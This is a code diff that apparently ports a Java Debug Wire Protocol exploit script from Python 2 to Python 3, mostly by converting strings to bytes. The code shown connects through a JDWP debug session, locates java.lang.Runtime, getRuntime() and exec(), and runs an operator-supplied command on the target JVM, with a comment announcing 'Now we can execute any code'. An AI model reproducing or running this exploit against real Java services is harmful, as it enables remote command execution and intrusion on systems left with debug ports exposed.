@@ -134,10 +134,10 @@ class JDWPClient:
                     data[name] = buf[index+4:index+4+l]
                     index += 4+l
                 elif fmt == 'C':
-                    data[name] = struct.unpack(">B", buf[index])[0]
+                    data[name] = buf[index]
                     index += 1
                 elif fmt == 'Z':
-                    t = struct.unpack(">B", buf[index])[0]
+                    t = buf[index]
                     if t == 115:
                         s = self.solve_string(buf[index+1:index+9])
                         data[name] = s
@@ -305,13 +305,13 @@ class JDWPClient:
         field = self.parse_entries(buf, formats)[0]
         return field
 
-    def createstring(self, data):
+    def createstring(self, data: bytes):
         buf = self.buildstring(data)
         self.socket.sendall( self.create_packet(CREATESTRING_SIG, data=buf) )
         buf = self.read_reply()
         return self.parse_entries(buf, [(self.objectIDSize, "objId")], False)
 
-    def buildstring(self, data):
+    def buildstring(self, data: bytes):
         return struct.pack(">I", len(data)) + data
 
     def readstring(self, data):
@@ -424,7 +424,7 @@ def runtime_exec(jdwp, args):
     print(("[+] Reading settings for '%s'" % jdwp.version))
 
     # 1. get Runtime class reference
-    runtimeClass = jdwp.get_class_by_name("Ljava/lang/Runtime;")
+    runtimeClass = jdwp.get_class_by_name(b"Ljava/lang/Runtime;")
     if runtimeClass is None:
         print ("[-] Cannot find class Runtime")
         return False
@@ -432,7 +432,7 @@ def runtime_exec(jdwp, args):
 
     # 2. get getRuntime() meth reference
     jdwp.get_methods(runtimeClass["refTypeId"])
-    getRuntimeMeth = jdwp.get_method_by_name("getRuntime")
+    getRuntimeMeth = jdwp.get_method_by_name(b"getRuntime")
     if getRuntimeMeth is None:
         print ("[-] Cannot find method Runtime.getRuntime()")
         return False
@@ -477,7 +477,7 @@ def runtime_exec(jdwp, args):
 
     # 5. Now we can execute any code
     if args.cmd:
-        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
+        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd.encode('utf8','ignore'))
     else:
         # by default, only prints out few system properties
         runtime_exec_info(jdwp, tId)
@@ -523,13 +523,13 @@ def runtime_exec_info(jdwp, threadId):
                   "user.dir": "User's current working directory"
                 }
 
-    systemClass = jdwp.get_class_by_name("Ljava/lang/System;")
+    systemClass = jdwp.get_class_by_name(b"Ljava/lang/System;")
     if systemClass is None:
         print ("[-] Cannot find class java.lang.System")
         return False
 
     jdwp.get_methods(systemClass["refTypeId"])
-    getPropertyMeth = jdwp.get_method_by_name("getProperty")
+    getPropertyMeth = jdwp.get_method_by_name(b"getProperty")
     if getPropertyMeth is None:
         print ("[-] Cannot find method System.getProperty()")
         return False
@@ -584,7 +584,7 @@ def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, comma
     print(("[+] Runtime.getRuntime() returned context id:%#x" % rt))
 
     # 3. find exec() method
-    execMeth = jdwp.get_method_by_name("exec")
+    execMeth = jdwp.get_method_by_name(b"exec")
     if execMeth is None:
         print ("[-] Cannot find method Runtime.exec()")
         return False
@@ -604,13 +604,13 @@ def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, comma
 
 
 def str2fqclass(s):
-    i = s.rfind('.')
+    i = s.rfind(b'.')
     if i == -1:
         print("Cannot parse path")
         sys.exit(1)
 
     method = s[i:][1:]
-    classname = 'L' + s[:i].replace('.', '/') + ';'
+    classname = b'L' + s[:i].replace(b'.', b'/') + b';'
     return classname, method
 
 
@@ -628,7 +628,7 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    classname, meth = str2fqclass(args.break_on)
+    classname, meth = str2fqclass(args.break_on.encode('utf8','ignore'))
     setattr(args, "break_on_class", classname)
     setattr(args, "break_on_method", meth)
 
